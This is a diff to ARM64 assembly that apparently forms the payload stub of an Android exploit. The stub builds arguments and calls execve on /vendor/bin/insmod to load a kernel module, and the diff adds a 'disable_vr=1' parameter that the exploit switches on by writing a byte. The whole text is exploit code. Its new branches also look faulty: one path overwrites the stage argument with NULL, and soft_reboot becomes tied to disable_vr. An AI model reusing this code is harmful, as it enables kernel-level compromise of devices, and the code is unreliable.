@@ -35,6 +35,10 @@ param_stage:
     .ascii "stage="                 /* value written at stage_val before insmod */
 stage_val:
     .skip 12, 0                     /* "N\0" plus slack; exploit writes the digit */
+param_disable_vr:
+    .ascii "disable_vr=1"           /* added when exploit writes a digit at dvr_val */
+dvr_val:
+    .skip 4, 0
 
     .balign 4
     .global libcxx_ko_target_off
@@ -49,6 +53,9 @@ libcxx_pkg_val_off:
     .global libcxx_stage_val_off
 libcxx_stage_val_off:
     .int stage_val - libcxx_data
+    .global libcxx_dvr_val_off
+libcxx_dvr_val_off:
+    .int dvr_val - libcxx_data
 soft_reboot_flag:
     .byte 0
 
@@ -138,7 +145,7 @@ libcxx_start:
 
     // execve("/vendor/bin/insmod",
     //        [exe_path, ko_target, "package_name=<pkg>", ["stage=N",]
-    //        ["soft_reboot=1",] NULL], NULL)
+    //        ["disable_vr=1",] ["soft_reboot=1",] NULL], NULL)
     adr     x1, exe_path
     str     x1, [sp]
     adr     x1, ko_target
@@ -151,20 +158,32 @@ libcxx_start:
     cbz     w9, insmod_no_stage
     adr     x1, param_stage
     str     x1, [sp, 24]
+    // disable_vr is only passed when the exploit wrote a digit at dvr_val
+    adr     x1, dvr_val
+    ldrb    w9, [x1]
+    cbz     w9, insmod_no_sr
+    adr     x1, param_disable_vr
+    str     x1, [sp, 32]
+    adr     x9, soft_reboot_flag
+    ldrb    w9, [x9]
+    cbz     w9, insmod_no_sr
+    adr     x1, param_soft_reboot
+    str     x1, [sp, 40]
+    str     xzr, [sp, 48]
+    b       do_insmod
+insmod_no_stage:
+    // no stage arg; disable_vr can still be set
+    adr     x1, dvr_val
+    ldrb    w9, [x1]
+    cbz     w9, insmod_no_sr
+    adr     x1, param_disable_vr
+    str     x1, [sp, 24]
     adr     x9, soft_reboot_flag
     ldrb    w9, [x9]
     cbz     w9, insmod_no_sr
     adr     x1, param_soft_reboot
     str     x1, [sp, 32]
     str     xzr, [sp, 40]
-    b       do_insmod
-insmod_no_stage:
-    adr     x9, soft_reboot_flag
-    ldrb    w9, [x9]
-    cbz     w9, insmod_no_sr
-    adr     x1, param_soft_reboot
-    str     x1, [sp, 24]
-    str     xzr, [sp, 32]
     b       do_insmod
 insmod_no_sr:
     str     xzr, [sp, 24]
